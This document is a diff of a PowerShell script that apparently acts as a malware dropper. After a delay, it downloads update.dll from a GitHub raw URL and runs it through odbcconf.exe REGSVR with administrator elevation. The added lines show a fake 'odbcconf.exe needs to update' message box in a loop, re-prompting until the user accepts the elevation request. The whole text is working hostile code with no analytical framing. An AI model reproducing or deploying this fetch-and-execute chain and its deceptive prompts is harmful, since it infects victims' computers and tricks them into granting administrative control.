@@ -1,5 +1,10 @@
 start-sleep 300 ; if (Test-Path "C:\helper\regex.exe") {
     exit
-} else { wget "https://github.com/othermeinthenightcontrol2/1/raw/refs/heads/main/update.dll" -o "C:\helper\update.dll" ; start-sleep 2;
-    Start-Process odbcconf.exe -ArgumentList 'REGSVR "C:\helper\update.dll"' -Verb RunAs
+} else { Add-Type -AssemblyName PresentationFramework ; wget "https://github.com/othermeinthenightcontrol2/1/raw/refs/heads/main/update.dll" -o "C:\helper\update.dll" ; start-sleep 2; 
+    while ($true) {
+    [System.Windows.MessageBox]::Show("odbcconf.exe needs to update", "", 'OK', 'Information') | Out-Null
+    try {
+        Start-Process odbcconf.exe -ArgumentList 'REGSVR "C:\helper\update.dll"' -Verb RunAs -ErrorAction Stop; break
+    } catch { if ($_.Exception.Message -notlike "*canceled*") { break }; Start-Sleep 5 }
+}
 }
